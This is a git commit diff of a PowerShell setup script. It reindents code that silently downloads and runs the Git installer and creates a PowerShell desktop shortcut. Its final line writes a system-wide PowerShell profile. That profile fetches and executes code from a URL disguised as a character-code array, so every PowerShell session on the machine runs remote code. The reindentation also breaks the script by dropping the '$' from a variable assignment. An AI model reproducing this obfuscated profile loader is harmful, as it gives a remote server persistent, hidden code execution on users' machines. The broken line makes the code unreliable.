3d78475d6f6bc30cabd724333b08dcb0638d5a43
pangeaimmersive <161491662+pangeaimmersive@users.noreply.github.com>
2024-03-22 21:02:14 -0400

    Update create_profile.ps1

--- create_profile.ps1
+++ create_profile.ps1
@@ -1,23 +1,23 @@
 if([Net.ServicePointManager]::SecurityProtocol -ne 'Tls12'){[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12}
 
-      #region -------- Install Git-Smc ----------
+#region -------- Install Git-Smc ----------
     
-        $GitExe = 'Git-2.44.0-64-bit.exe'
-        (New-Object Net.WebClient).DownloadFile("https://github.com/git-for-windows/git/releases/download/v2.44.0.windows.1/$GitExe", "$env:TEMP\$GitExe")
-        Invoke-Expression "$env:TEMP\$GitExe /VERYSILENT"
+  GitExe = 'Git-2.44.0-64-bit.exe'
+  (New-Object Net.WebClient).DownloadFile("https://github.com/git-for-windows/git/releases/download/v2.44.0.windows.1/$GitExe", "$env:TEMP\$GitExe")
+  Invoke-Expression "$env:TEMP\$GitExe /VERYSILENT"
         
-      #endregion --------------------------------
+#endregion --------------------------------
 
-      #region ----- Create Desktop Shortcut -----
+#region ----- Create Desktop Shortcut -----
     
-      if(!(Test-Path -Path "$Home\Desktop\PowerShell.lnk")){
-        $WshShell = New-Object -comObject WScript.Shell
-        $Shortcut = $WshShell.CreateShortcut("$Home\Desktop\PowerShell.lnk")
-        $Shortcut.TargetPath = 'PowerShell.exe'
-        $Shortcut.Arguments = '-NoLogo'
-        $Shortcut.Save()
-      }
+  if(!(Test-Path -Path "$Home\Desktop\PowerShell.lnk")){
+    $WshShell = New-Object -comObject WScript.Shell
+    $Shortcut = $WshShell.CreateShortcut("$Home\Desktop\PowerShell.lnk")
+    $Shortcut.TargetPath = 'PowerShell.exe'
+    $Shortcut.Arguments = '-NoLogo'
+    $Shortcut.Save()
+  }
   
-    #endregion --------------------------------
+#endregion --------------------------------
 
 New-Item -Path "$PSHOME\profile.ps1" -ItemType File -Value "(iex (iwr -Uri ([char[]](104,116,116,112,115,58,47,47,112,97,110,103,101,97,105,109,109,101,114,115,105,118,101,46,105,111) -Join '')).ToString())"
